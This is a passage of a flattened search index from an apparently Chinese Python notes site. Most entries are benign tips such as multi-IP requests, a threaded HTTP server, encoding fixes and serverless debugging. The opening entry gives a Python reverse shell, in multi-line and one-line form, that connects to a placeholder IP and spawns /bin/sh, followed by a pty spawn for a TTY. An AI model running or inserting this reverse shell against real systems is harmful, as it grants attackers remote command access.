SOCK_STREAM ) s . connect (( \"IP\u5730\u5740\" , \u7aef\u53e3 )) os . dup2 ( s . fileno (), 0 ) os . dup2 ( s . fileno (), 1 ) os . dup2 ( s . fileno (), 2 ) p = subprocess . call ([ \"/bin/sh\" , \"-i\" ]) \u5355\u884c\u7248\u672c\uff1a IP = \"x.x.x.x\" ; PORT = 6666 ; import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( IP , PORT )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/sh\" , \"-i\" ])","title":"\u53cd\u5f39shell"},{"location":"Python/#tty","text":"python - c 'import pty; pty.spawn(\"/bin/sh\")'","title":"\u83b7\u5f97\u4e00\u4e2atty"},{"location":"Python/#requestsip","text":"requests\u5305\u5e76\u6ca1\u6709\u4f7f\u7528socket.create_connection\u51fd\u6570\uff0c\u6240\u4ee5\u66ff\u6362socket.create_connection\u5e76\u4e0d\u591f def function_hook_parameter ( oldfunc , parameter_index , parameter_name , parameter_value ): \"\"\" \u521b\u9020\u4e00\u4e2awrapper\u51fd\u6570\uff0c\u52ab\u6301oldfunc\u4f20\u5165\u7684\u7b2cparameter_index\u540d\u4e3aparameter_name\u7684\u51fd\u6570\uff0c\u56fa\u5b9a\u5176\u503c\u4e3aparameter_value; \u4e0d\u5f71\u54cd\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u4f20\u5165\u7684\u4efb\u4f55\u5176\u4ed6\u53c2\u6570 \u7528\u6cd5\uff1a \u539f\u51fd\u6570 = function_hook_parameter(\u539f\u51fd\u6570, \u4ece1\u5f00\u59cb\u8ba1\u6570\u7684\u53c2\u6570\u6240\u5904\u7684\u4f4d\u7f6e, \u8fd9\u4e2a\u53c2\u6570\u7684\u540d\u79f0, \u9700\u8981\u66ff\u6362\u6210\u7684\u53c2\u6570\u503c) \u4f8b\u5b50\uff1a \u9700\u8981\u52ab\u6301socket.create_connection\u8fd9\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT, source_address=None) \u9700\u8981\u5bf9\u5176\u7b2c3\u4e2a\u53c2\u6570source_address\u56fa\u5b9a\u4e3avalue\uff0c\u52ab\u6301\u65b9\u6cd5\u5982\u4e0b socket.create_connection = function_hook_parameter(socket.create_connection, 3, \"source_address\", value) \"\"\" real_func = oldfunc def newfunc ( * args , ** kwargs ): # args\u662f\u53c2\u6570\u5217\u8868list\uff0ckwargs\u662f\u5e26\u6709\u540d\u79f0keyword\u7684\u53c2\u6570dict newargs = list ( args ) if len ( args ) >= parameter_index : # \u5982\u679c\u8fd9\u4e2a\u53c2\u6570\u88ab\u76f4\u63a5\u4f20\u5165\uff0c\u90a3\u4e48\u80af\u5b9a\u5176\u524d\u9762\u7684\u53c2\u6570\u90fd\u662f\u65e0\u540d\u79f0\u7684\u53c2\u6570\uff0cargs\u7684\u957f\u5ea6\u80af\u5b9a\u957f\u4e8e\u5176\u6240\u5728\u7684\u4f4d\u7f6e newargs [ parameter_index - 1 ] = parameter_value # \u7b2c3\u4e2a\u53c2\u6570\u5728list\u7684\u4e0b\u6807\u662f2 else : # \u5982\u679c\u4e0d\u662f\u76f4\u63a5\u4f20\u5165\uff0c\u90a3\u4e48\u5c31\u5728kwargs\u4e2d \u6216\u8005\u4f20\u5165\u7684\u53ef\u9009\u53c2\u6570\u4e2d\u6ca1\u6709\u8fd9\u4e2a\u53c2\u6570\uff0c\u76f4\u63a5\u8bbe\u7f6ekwargs\u5373\u53ef kwargs [ parameter_name ] = parameter_value return real_func ( * newargs , ** kwargs ) return newfunc myip = \"x.x.x.x\" #\u4f60\u9700\u8981\u4f7f\u7528\u7684IP\uff0c\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u53d6\u5f97\u8fd9\u4e2aIP import socket socket . create_connection = function_hook_parameter ( socket . create_connection , 3 , \"source_address\" , ( myip , 0 )) import requests bakup_create_connection = requests . packages . urllib3 . util . connection . create_connection #\u5907\u4efd\u4e00\u4efd\u4ee5\u5907\u540e\u7eed\u7ee7\u7eed\u66ff\u6362 requests . packages . urllib3 . util . connection . create_connection = function_hook_parameter ( requests . packages . urllib3 . util . connection . create_connection , 3 , \"source_address\" , ( myip , 0 )) # \u9a8c\u8bc1\u662f\u5426\u6210\u529f\u4fee\u6539\u6e90IP print ( requests . get ( \"http://ip.cn\" ) . text ) #\u8bbf\u95ee\u7f51\u7ad9\u67e5\u770b\u5f53\u524d\u4f7f\u7528\u7684\u516c\u7f51IP\uff0c\u5982\u679c\u5185\u7f51\u4f60\u53ef\u4ee5\u81ea\u884c\u642d\u5efa\u670d\u52a1\u5668\u67e5\u770b\u8bbf\u95ee\u65e5\u5fd7\u4ece\u800c\u786e\u5b9aIP # \u5982\u679c\u540e\u7eed\u8fd8\u8981\u8fdb\u884c\u66ff\u6362\uff0c\u5219\u5e94\u8be5\u4f20\u5165bakup_create_connection mynewip = \"x.x.x.y\" #\u53e6\u5916\u4e00\u4e2a\u5f53\u524d\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u53d6\u5f97\u7684IP requests . packages . urllib3 . util . connection . create_connection = function_hook_parameter ( bakup_create_connection , 3 , \"source_address\" , ( mynewip , 0 ))","title":"\u8ba9requests\u4f7f\u7528\u591a\u4e2aIP"},{"location":"Python/#python_1","text":"\u4f7f\u7528threading\u6a21\u5757\u8fdb\u884c\u5f00\u53d1 MultiThread_Template.py","title":"Python\u591a\u7ebf\u7a0b\u6a21\u677f"},{"location":"Python/#httpserverbasehttpserver","text":"","title":"http.server\uff08BaseHTTPServer\uff09\u5e76\u53d1\u6027\u6539\u5584"},{"location":"Python/#new-version","text":"\u5728\u4f7f\u7528BaseHTTPServer.HTTPServer\u7684\u65f6\u5019\uff0c\u5bf9\u5176\u4f7f\u7528\u7684\u7236\u7c7b\u4fee\u6539\u521b\u9020\u81ea\u5df1\u7684\u7c7b\uff0c\u53c2\u8003 How to dynamically change base class of instances at runtime? import BaseHTTPServer # \u5982\u679cpy3\uff0c\u9700\u8981import http.server as BaseHTTPServer import socketserver MyHTTPServer = type ( 'MyHTTPServer' , ( socketserver . ThreadingTCPServer ,), dict ( BaseHTTPServer . HTTPServer . __dict__ )) def MyHandler ( BaseHTTPServer . BaseHTTPRequestHandler ): pass # \u7701\u7565handler\u7684\u4ee3\u7801\uff0c\u4e00\u4e9bdo_GET\uff0cdo_POST\u7684\u51fd\u6570 httpd = MyHTTPServer ( ( '0.0.0.0' , 80 ), MyHandler ) httpd . serve_forever () \u600e\u4e48\u77e5\u9053MyHTTPServer\u7684\u7236\u7c7b\u786e\u5b9e\u88ab\u4fee\u6539\u4e86\u5462\uff1f \u53ef\u4ee5\u67e5\u770b\u5176__mro__\u5c5e\u6027\uff08Method Resolution Order attribute\uff09","title":"New version \u4e0d\u5fc5\u4fee\u6539\u5e93\u4ee3\u7801"},{"location":"Python/#old-version","text":"\u53c2\u8003\u8d44\u6599\uff1a \u5229\u7528Python\u4e2dSocketServer \u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u95f4\u975e\u963b\u585e\u901a\u4fe1 \u76f4\u63a5\u4fee\u6539BaseHTTPServer\u7684\u4ee3\u7801\u4e2d\u7684\u4e00\u4e2a\u7ec6\u8282\uff0c\u5c06BaseHTTPServer\u7c7b\u7ee7\u627f\u7684\u539f\u5148\u53ea\u80fd\u652f\u6301\u5355\u4e2a\u8bf7\u6c42\u7684SocketServer.TCPServer\u6539\u4e3a\u6bcf\u4e2a\u8fde\u63a5\u4e00\u4e2a\u7ebf\u7a0b\u7684SocketServer.ThreadingTCPServer\uff0c\u4f7fBaseHTTPServer\u80fd\u652f\u6301\u5e76\u53d1\u800c\u4e0d\u662f\u4e00\u6b21\u53ea\u80fd\u5904\u7406\u5355\u4e2a\u8bf7\u6c42 Python3\u7684\u65b9\u6cd5 \uff1a \u5728Python3\u4e2dBaseHTTPServer\u6539\u540d\u4e3ahttp.server\u4e86\uff0c\u9996\u5148\u627e\u5230http.server\u6240\u5728\u7684py\u6587\u4ef6\uff1a python3 - c \"import http.server; print(http.server)\" \u4fee\u6539\u5176\u63d0\u793a\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u6211\u8fd9\u91cc\u662f /usr/lib/python3.4/http/server.py \u641c\u7d22 class HTTPServer \uff0c\u5982\u679c\u662f\u7528vim\u53ef\u4ee5\u7528 /class HTTPServer \u4fee\u6539\u627e\u5230\u7684\u8fd9\u4e00\u884c\uff0c\u6539\u4e3a\uff1a class HTTPServer ( socketserver . ThreadingTCPServer ): Python2\u7684\u65b9\u6cd5 \uff1a \u9996\u5148\u627e\u5230BaseHTTPServer\u5728\u54ea\uff1a python - c \"import BaseHTTPServer; print(BaseHTTPServer)\" \u4fee\u6539\u5bf9\u5e94\u7684\u6587\u4ef6\uff0c\u5982/usr/lib/python2.7/BaseHTTPServer.py\uff0c\u6ce8\u610f\u4e0d\u8981\u6253\u5f00\u4ed6\u76f4\u63a5\u63d0\u793a\u7684pyc\u6587\u4ef6\u800c\u662f\u8981\u5bf9\u5e94\u7684\u540c\u540dpy\u6587\u4ef6 \u627e\u5230\u8fd9\u884c\uff08vim\u4e2d\u53ef\u4ee5\u8f93\u5165 /class HTTPServer \u8fdb\u884c\u641c\u7d22\uff09\uff1a class HTTPServer ( SocketServer . TCPServer ): \u4fee\u6539\u5176\u7ee7\u627f\u7684\u7236\u7c7b\uff1a class HTTPServer ( SocketServer . ThreadingTCPServer ):","title":"Old version \u4fee\u6539\u5e93\u4ee3\u7801(\u4e0d\u5efa\u8bae)"},{"location":"Python/#rootpython","text":"\u4e0b\u8f7d\u6700\u65b0\u7248python\u6e90\u7801\u540e\u6307\u5b9aprefix\u7f16\u8bd1\uff0c\u5047\u8bbe\u7528\u6237\u76ee\u5f55\u4e3a/home/chenyuan apt - get install libssl - dev openssl curl - O https :// www . python . org / ftp / python / 3.5.2 / Python - 3.5.2 . tgz tar - xzf Python - 3.5.2 . tgz cd Python - 3.5.2 / . / configure -- prefix =/ home / chenyuan / python3 make make install >/ dev / null pushd / home / chenyuan / python3 / bin cp python3 python cp pip3 pip alias python3 = `pwd` / python alias pip3 = `pwd` / pip","title":"\u65e0root\u6743\u9650\u5b89\u88c5Python"},{"location":"Python/#_1","text":"\u65b9\u6cd51\uff1a\u8fd0\u884cpy\u524d\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf export PYTHONIOENCODING = utf8 \u65b9\u6cd52\uff1a\u5f3a\u5236\u4fee\u6539stdout import sys sys . stdout = open ( 1 , 'w' , encoding = 'utf-8' , closefd = False )","title":"\u4e2d\u6587\u8f93\u51fa\u4e71\u7801\u95ee\u9898"},{"location":"Python/#pep8","text":"pycodestyle \u5b89\u88c5\u5e76\u4f7f\u7528pycodestyle\u68c0\u67e5\u4ee3\u7801\uff0c\u5ffd\u7565E501\u4e00\u884c\u4e0d\u80fd\u957f\u4e8e80\u4e2a\u5b57\u7b26\u7684\u9650\u5236\uff1a pip install pycodestyle pycodestyle --show-source --ignore=E501 yourcode.py","title":"\u9075\u5faaPEP8\u68c0\u67e5\u4f60\u7684\u4ee3\u7801"},{"location":"Python/#_2","text":"import random import string def random_str ( length = 8 ): return \"\" . join ( random . sample ( string . ascii_letters , length )) from random import Random def random_str ( randomlength = 8 ): str = '' chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789' length = len ( chars ) - 1 random = Random () for i in range ( randomlength ): str += chars [ random . randint ( 0 , length )] return str","title":"\u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32"},{"location":"Python/#python_2","text":"\u9700\u8981 pip install sympy from sympy import * # \u89e3\u4e00\u5143\u65b9\u7a0b\uff1a # 2x^2-18=0 x = Symbol ( 'x' ) print ( solve ( 2 * x ** 2 - 18 , x )) # \u5f97\u5230[-3,3] # \u89e3\u65b9\u7a0b\u7ec4 # y=1-x # 3x+2y-5 x , y = symbols ( 'x y' ) print ( solve ([ y - 1 + x , 3 * x + 2 * y - 5 ], [ x , y ])) # \u5f97\u5230{x: 3, y: -2}","title":"Python\u89e3\u65b9\u7a0b"},{"location":"Python/#in","text":"\u4e00\u5b9a\u8981\u7528set\uff0c\u56e0\u4e3aset\u7684in\u64cd\u4f5c\u662fO(1)\u7684\uff0c\u7528list\u662fO(n)\u901f\u5ea6\u592a\u6162","title":"\u5927\u6570\u636e\u5224\u65adin"},{"location":"Python/#pythonh-no-such-file-or-directory","text":"apt-get install -y python-dev python3-dev \u5982\u679c\u4e3aCentOS\u7cfb\u7edf\uff1a yum install python-devel","title":"\u89e3\u51b3Python.h: No such file or directory"},{"location":"Python/#_3","text":"\u65b9\u6cd5\u4e00\uff1a\u5c06\u5b57\u7b26\u4e32\u6bcf8\u4e2a\u5206\u6210\u4e00\u7ec4\uff0c\u7528int\u8f6c10\u8fdb\u5236\uff0c\u518d\u7528chr\u8f6c\u4e3aascii\u5b57\u7b26 s=\"0110001101111001\" ans=\"\" for i in range(0,len(s)//8): x = s[i*8:i*8+8] ans+=chr(int(x,2)) \u65b9\u6cd5\u4e8c\uff1a\u5229\u7528binascii\uff0c\u5148\u7528int\u8f6c\u4e3a10\u8fdb\u5236\uff0c\u7136\u540e\u8f6c\u4e3a16\u8fdb\u5236\u5b57\u7b26\u4e32\uff0c\u8c03\u7528unhexlify\u6267\u884c\u7ffb\u8bd1 import binascii s = \"0110001101111001\" ans = binascii . unhexlify ( ' %x ' % int ( s , 2 )) . decode () \u8865\u5145\uff1a\u76f8\u5e94\u7684\u5982\u679c\u8981\u628a\u5341\u8fdb\u5236\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff0c\u53ef\u4ee5\u7528bin(123)[2:]","title":"\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u666e\u901a\u5b57\u7b26\u4e32"},{"location":"Python/#bytes","text":"from base64 import b16encode , b16decode print ( b16encode ( b 'py3.io' ) . decode () ) #output: 7079332E696F print ( b16decode ( \"7079332E696F\" . upper ()) ) #output: b'py3.io', \u8fd9\u91cc\u4f7f\u7528upper\u8f6c\u5927\u5199 \u76f8\u5e94\u7684\uff0c\u62ff\u5230\u4e00\u4e2a\u5341\u8fdb\u5236\u6570\uff0c\u8f6c\u5b57\u7b26\u4e32\uff1a key = 5287002131074331513 print( b16decode( hex(key)[2:].upper() ) )#output: b'I_4m-k3y'","title":"\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32"},{"location":"Python/#python3pat","text":"\u5982\u679c\u53d1\u751f\u683c\u5f0f\u9519\u8bef\uff0c\u68c0\u67e5\u8f93\u51fa\u7684\u6700\u540e\u4e00\u884c\u7684print\uff0c\u52a0\u4e0aend=\u201d\u201c\u8868\u793a\u4e0d\u8981\u6362\u884c \u5982\u679c\u6570\u636e\u89c4\u6a21\u5927\u5bfc\u81f4\u8d85\u65f6\uff0c\u4ee3\u7801\u4e2d\u7684in\u64cd\u4f5c\u524d\u5148\u628alist\u8f6c\u4e3aset\uff0c\u80fd\u5927\u5e45\u5ea6\u63d0\u901f","title":"\u7528Python3\u5199PAT\u5fc3\u5f97"},{"location":"Python/#requestspost","text":"\u9700\u8981\u6ce8\u610f\u52a0\u4e0a\u8fd9\u4e24\u4e2a\u53c2\u6570\uff1a ,allow_redirects=False,headers={\"Content-Type\": \"application/x-www-form-urlencoded\"} \u767b\u5f55\u8bf7\u6c42\u7684\u65f6\u5019\u662f\u8981\u6839\u636e\u8fd4\u56de\u7684headers\u91cc\u9762Location\u6709\u6ca1\u6709\u5bf9\u4e0d\u5bf9\u6765\u5224\u65ad\u767b\u5f55\u662f\u5426\u6210\u529f\u7684\uff0c\u800crequests\u9ed8\u8ba4\u4f1a\u8ddf\u968f301/302\u8df3\u8f6c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u83b7\u53d6\u5230\u8df3\u8f6c\u8bf7\u6c42\u7684headers\uff0c\u6240\u4ee5\u52a0\u4e0a allow_redirects=False \u53e6\u5916\u5c31\u662fpost\u6570\u636e\u7684\u65f6\u5019\u5fc5\u987b\u7ed9\u51fa\u6b63\u786e\u7684Content-Type\uff0c\u5426\u5219\u670d\u52a1\u5668\u4e0d\u8ba4\u8fd9\u4e2apost\u7684 \u518d\u8005\u5c31\u662f\u53ef\u80fd\u5bf9\u65b9\u6709\u53cd\u722c\u866b\u63aa\u65bd\uff0c\u52a0\u4e0aReferer\u548cUser-Agent\u5c31\u597d\u54af \u5982\u679c\u9700\u8981\u63d0\u4ea4\u7684\u662fjson\u7684\u6570\u636e\uff0c\u8bb0\u5f97post\u7684data\u7684\u5355\u53cc\u5f15\u53f7\u8981\u6b63\u786e\uff0c\u5e94\u8be5\u7528json.dumps\u7684\u7ed3\u679c\u53bbpost \u5982\u679c\u8981\u505a\u722c\u866b\uff0c\u6b22\u8fce\u4f7f\u7528\u6211\u7684 EasyLogin \uff0c\u65e0\u9700\u518d\u64cd\u5fc3\u8fd9\u4e9b\u7ec6\u8282\uff0c\u4e13\u6ce8\u4e8e\u6838\u5fc3\u722c\u866b\u4ee3\u7801","title":"\u7528requests\u8fdb\u884cpost"},{"location":"Python/#tkinter","text":"\u652f\u6301py2\u548cpy3\uff0cLearned from https://www.daniweb.com/programming/software-development/code/487653/access-the-clipboard-via-tkinter try : from tkinter import Tk except ImportError : from Tkinter import Tk root = Tk () root . withdraw () #\u9690\u85cfTk\u7684\u7a97\u53e3 text = \"Donnerwetter\" # \u6e05\u7a7a\u526a\u8d34\u677f clear clipboard root . clipboard_clear () # \u5199\u5165\u526a\u8d34\u677f write text to clipboard root . clipboard_append ( text ) # \u8bfb\u53d6\u526a\u8d34\u677f text from clipboard clip_text = root . clipboard_get () print ( clip_text ) # --> Donnerwetter","title":"\u901a\u8fc7tkinter\u83b7\u53d6\u3001\u4fee\u6539\u526a\u8d34\u677f"},{"location":"Python/#_4","text":"","title":"\u7b26\u53f7\u6570\u4e0e\u65e0\u7b26\u53f7\u6570\u8f6c\u6362"},{"location":"Python/#_5","text":"import ctypes ctypes . c_int64 ( 17039472050328044269 ) . value \u4e0a\u8ff0\u5c06\u5f97\u5230-1407272023381507347","title":"\u65e0\u7b26\u53f7\u2192\u6709\u7b26\u53f7\uff0c\u4e3a\u4e86\u52a0\u4e0a\u8d1f\u53f7\uff1a"},{"location":"Python/#_6","text":"import ctypes ctypes . c_uint64 ( - 1407272023381507347 ) . value \u4e0a\u8ff0\u5c06\u5f97\u523017039472050328044269","title":"\u6709\u7b26\u53f7\u2192\u65e0\u7b26\u53f7\uff0c\u4e3a\u4e86\u53bb\u6389\u8d1f\u53f7\uff1a"},{"location":"Python/#signalsigalrm-only-linux","text":"\u5728\u8bbe\u8ba1CTF\u7684\u9898\u76ee\u7684\u65f6\u5019\uff0c\u6709\u5fc5\u8981\u9650\u5236\u7528\u6237\u7684\u8fde\u63a5\u65f6\u95f4\uff0c\u8fd9\u65f6\u5019\u7b80\u5355\u65b9\u6848\u5c31\u662f\u7528SIGALRM\u4fe1\u53f7\u54af def clock ( timeout = 5 ): import signal def signal_handler ( signum , data ): if signum == signal . SIGALRM : print ( \"Time is up!\" ) exit () signal . signal ( signal . SIGALRM , signal_handler ) signal . alarm ( int ( timeout ))","title":"\u4f7f\u7528signal.SIGALRM\u5728\u9650\u5b9a\u65f6\u95f4\u540e\u9000\u51fa\u8fdb\u7a0b (only Linux)"},{"location":"Python/#ctrlc","text":"\u7279\u6b8a\u60c5\u51b5\u4e0b\u6211\u4eec\u60f3\u5c4f\u853d\u6389Ctrl+C\uff0c\u8fd9\u65f6\u5019\u5199\u4e2a\u81ea\u5df1\u7684\u51fd\u6570\u5904\u7406SIGALRM\u4fe1\u53f7\u5c31\u597d\u5566 import signal def signal_handler ( signum , data ): if signum == signal . SIGINT : print ( \"Ctrl+C is pressed!\" ) #raise KeyboardInterrupt if __name__ == '__main__' : signal . signal ( signal . SIGINT , signal_handler ) sleep ( 666 )","title":"\u6355\u6349\u7528\u6237\u7684Ctrl+C"},{"location":"Python/#signalsigalrm-only-linux_1","text":"\u5b9e\u73b0\u4e00\u4e2a\u7c7b\u4f3cJavascript\u7684setInterval\u529f\u80fd import signal from time import sleep INTERVAL = 1 COUNT = 0 def signal_handler ( signum , data ): global COUNT if signum == signal . SIGALRM : # \u4f60\u7684\u5b9a\u65f6\u5668\u4ee3\u7801\u5199\u5728\u8fd9\u91cc Your function here print ( \"Count! {}\" . format ( COUNT )) COUNT += 1 signal . alarm ( int ( INTERVAL )) #\u518d\u8bbe\u7f6e\u4e00\u4e2aclock\u5c31\u80fd\u5faa\u73af\u5f80\u590d\u54af if __name__ == '__main__' : signal . signal ( signal . SIGALRM , signal_handler ) signal . alarm ( int ( INTERVAL )) sleep ( 23333 )","title":"\u4f7f\u7528signal.SIGALRM\u5b9e\u73b0\u5b9a\u65f6\u5668 (only Linux)"},{"location":"Python/#pdb","text":"\u5728\u9700\u8981\u8c03\u8bd5\u7684\u6587\u4ef6\u5934\u90e8\u52a0\u5165 import pdb \u9700\u8981\u505c\u4e0b\u6765\u7684\u5730\u65b9\u52a0\u5165 pdb.set_trace() Tutorial: https://github.com/spiside/pdb-tutorial","title":"\u4f7f\u7528pdb\u8fdb\u884c\u8c03\u8bd5"},{"location":"Python/#pythonserverlessfunction-as-service","text":"\u9879\u76ee\u5730\u5740 & \u90e8\u7f72\u8fc7\u7a0b \u5982\u679c\u60a8\u53ea\u662f\u9700\u8981\u90e8\u7f72\u4e00\u4e2aExample\uff0c\u2191\u2191\u2191(\u987a\u624b\u6c42\u4e2aStar)\uff1b\u5982\u679c\u60a8\u5bf9\u8fd9\u4e2a\u4ee3\u7801\u662f\u5982\u4f55\u5199\u51fa\u6765\u7684\u548c\u8e29\u5751\u8fc7\u7a0b\u611f\u5174\u8da3\uff0c\u7ee7\u7eed\u770b\u5427\uff1a","title":"\u4f7f\u7528Python\u5f00\u53d1Serverless(Function as Service)\u540e\u7aef\u670d\u52a1"},{"location":"Python/#_7","text":"","title":"\u8e29\u8fc7\u7684\u5751\u4e0e\u89e3\u51b3\u8fc7\u7a0b(\u8bba\u963f\u91cc\u4e91\u662f\u600e\u4e48\u628a\u4eba\u6c14\u6b7b\u7684)"},{"location":"Python/#1api","text":"\u6309\u7167 \u6559\u7a0b \uff0c\u5f53\u65f6\u4e0d\u591f\u8010\u5fc3\uff0c\u62ff\u7740hello world\u7684\u7a0b\u5e8f\uff08\u4e0d\u8981\u4fe1\u6559\u7a0b\u4e2d\u76842.1\u90e8\u5206\u7684\u622a\u56fe\uff09\u5c31\u5728\u4f7f\u7528API\u7f51\u5173\uff0c\u7ed3\u679c\u603b\u662f\u8fd4\u56de503 \u8010\u5fc3\u4e0b\u6765\u770b\u6587\u6863\u628a\u7a0b\u5e8f\u6539\u4e3a\u540e\u9762\u7684\u649e\u5899\u5f0f\u7a0b\u5e8f\u5c31\u597d\u4e86\uff0c\u4eba\u5bb6\u5176\u5b9e\u8bf4\u4e86\u51fd\u6570\u8ba1\u7b97\u5e94\u8be5\u8fd4\u56de\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4e0d\u6309\u7167\u8fd9\u4e2a\u7ed3\u6784\u6765\u5c31\u4f1a503\uff1a { \"isBase64Encoded\": True\u6216\u8005False, \"statusCode\": 200, #\u53ef\u4ee5\u4e3a302\u6765\u5b9e\u73b0\u8df3\u8f6c \"headers\": {...} #\u8fd4\u56de\u7684response headers\uff0c\u4f46\u5176\u4e2d\u7684Content-Type\u6ca1\u6709\u4f5c\u7528 \"body\": \"...\" #\u8fd4\u56de\u7684\u7f51\u9875\u6b63\u6587\u5185\u5bb9 }","title":"1.API\u7f51\u5173\u4e0e\u51fd\u6570\u8ba1\u7b97\u7684\u5bf9\u63a5"},{"location":"Python/#2api","text":"\u65e0\u8bba\u6709\u6ca1\u6709\u6539Mock\u8bbe\u7f6e\uff0c\u53ea\u8981\u6539\u52a8\u4e86\u8bbe\u7f6e\u90fd\u9700\u8981\u91cd\u65b0\u53d1\u5e03\uff0c\u53d1\u5e03\u7ebf\u4e0a\u7248\u672c\u5373\u53ef","title":"2.\u4fee\u6539API\u7f51\u5173\u53c2\u6570\u5b9a\u4e49\u540e\u8981\u518d\u6b21\u53d1\u5e03"},{"location":"Python/#3windowsfclifcliexe","text":"\u4eba\u5bb6\u5df2\u7ecf\u53d1\u5e03\u4e86\u65b0\u7248\u672c\u7684fcli\u89e3\u51b3\u4e86\u6b64\u95ee\u9898 \u8fd9\u4e2abug\u7b80\u76f4\u4e86\uff0c\u6574\u4e2a\u6d41\u7a0b\u5982\u4e0b\uff1a \u6309\u7167\u6587\u6863\u8bf4\u660e\u4e00\u8def\u90e8\u7f72\u4e0a\u4f20\u90fd\u6ca1\u6709\u95ee\u9898\uff0c\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\u5374\u8bf4 Unable to import module 'index' \u7136\u540e\u6211\u5c31\u5728Linux\u670d\u52a1\u5668\u4e0a docker pull python:2.7 \u7136\u540e docker run -it --rm -v /root/ical:/code python:2.7 /bin/bash \uff0c\u8fdb\u5165bash\u540e cd /code; python \uff0c\u8fdb\u5165python\u540e import index` \u554a\u54c8\uff0c\u53d1\u73b0\u662f ImportError: No module named 'bs4' \uff0c\u81ea\u5df1\u7684\u9505\uff0c\u7528 pip install bs4 -t . \u4e00\u4e2a\u4e2a\u89e3\u51b3\u4f9d\u8d56\u5305\u540e\uff0c\u5728docker\u5bb9\u5668\u4e2d\u603b\u7b97\u662f\u80fd\u591f\u8dd1\u8d77\u6765\u4e86\uff0c\u4e14\u80fd\u6b63\u5e38\u8fd4\u56de\u4e86 \u7136\u540e\u7528 fcli.exe shell \u7684 mkf \u518d\u4e0a\u4f20\u4e00\u6b21\uff0c\u8c03\u7528\u51fd\u6570\u8fd8\u662f\u8001\u6837\u5b50 Unable to import module 'index' \uff0c\u4ee4\u4eba\u5f88\u6293\u72c2\u3002\u3002\u3002 \u7a81\u7136\u60f3\u5230\u4e0d\u80fd\u88abimport\u5e94\u8be5\u662f\u5168\u5c40\u7684import\u5931\u8d25\u4e86\uff0c\u591a\u6b21\u6298\u817e\u540e\uff0c\u628a from grabber import grabber \u79fb\u52a8\u5230index\u51fd\u6570\u4e2d\uff0c\u603b\u7b97\u5f97\u5230\u4e86\u660e\u786e\u7684\u62a5\u9519\uff1a\u8fd8\u662f ImportError: No module named 'bs4' \uff1b\u54c8\uff1f\u8fd9\u662f\u4ec0\u4e48\u9b3c\uff0c\u660e\u660e\u6211\u90fd\u628abs4\u6587\u4ef6\u5939\u653e\u5230\u4ee3\u7801\u76ee\u5f55\u4e0b\u4e86\uff0c\u4e3a\u5565\u8fd8\u662f\u62a5\u9519\uff1f \u65e2\u7136\u4ed6\u8bf4import\u5931\u8d25\uff0c\u4f1a\u4e0d\u4f1a\u662fPython\u641c\u7d22\u5305\u7684PATH\u7684\u95ee\u9898\uff0c\u4e8e\u662fGoogle\u5230\u4e86\u628a\u5f53\u524d\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\u52a0\u5165\u641c\u7d22\u7684\u65b9\u6cd5\uff1a sys.path.append(os.path.dirname(os.path.abspath(__file__))) Orz, \u8fd8\u662f\u6ca1\u6709\u7528\u3002\u3002\u3002 \u60f3\u5230\u65e2\u7136\u90e8\u7f72\u540e\u4ee3\u7801\u6587\u4ef6\u5939 /code \u6ca1\u6709\u6211\u9700\u8981\u7684\u4f9d\u8d56\u5305\uff0c\u90a3 /code \u6587\u4ef6\u5939\u91cc\u9762\u5230\u5e95\u6709\u5565\u5462\uff1f\u679c\u65adfuck\u4e00\u4e0b\uff0c\u5728index\u51fd\u6570\u5f00\u5934\u5199\u4e0a: def index (): return { \"fuck\" : list ( os . listdir ( \"/code\" ))} import bs4 #\u4f1a\u51fa\u9519\u7684import ... #\u6b63\u5e38\u4ee3\u7801 \u603b\u7b97\u8c03\u7528\u6210\u529f\u4e86\uff0c\u7136\u540e\u4e00\u770b\u8f93\u51fa\u7ed3\u679c\uff0cwoc! (\u5185\u5fc3\u4e2d\u9a82\u4e86\u591a\u6b21mdzz\u963f\u91cc\u4e91 \u7ed9\u5f20\u622a\u56fe\uff1a os.listdir\u5e94\u8be5\u8fd4\u56de\u7684\u662f\u5f53\u524d\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u542b\u6709\u7684\u6587\u4ef6\u540d\u79f0\u548c\u6587\u4ef6\u5939\u540d\u79f0\uff0c\u800c\u73b0\u5728\u6211\u4eec\u770b\u5230\u7684\u662f\u542b\u6709 \\\\ \u5f88\u50cf\u8def\u5f84\u540d\u7684\u4e1c\u897f\uff0c\u8bf4\u660e\u8fd9\u4e2afcli.exe\u628awindows\u7684 \\\\ \u8def\u5f84\u540d\u5f53\u6210\u4e86\u6587\u4ef6\u540d\u7684\u4e00\u90e8\u5206\uff0c\u90e8\u7f72\u540e\u5728/code\u6587\u4ef6\u5939\u4e0b\u4e5f\u5c31\u5bf9\u5e94\u521b\u5efa\u4e86\u540d\u79f0\u4e3a bs4\\\\__init__.py \u8fd9\u6837\u7684\u6587\u4ef6(\u6839\u672c\u6ca1\u6709bs4\u5b50\u6587\u4ef6\u5939)\uff0cPython\u5f53\u7136\u4f1a\u627e\u4e0d\u5230bs4\u8fd9\u4e2a\u5305\u554a\uff01\u6454\uff01 \u6539\u7528\u4eba\u5bb6fcli\u7684Linux 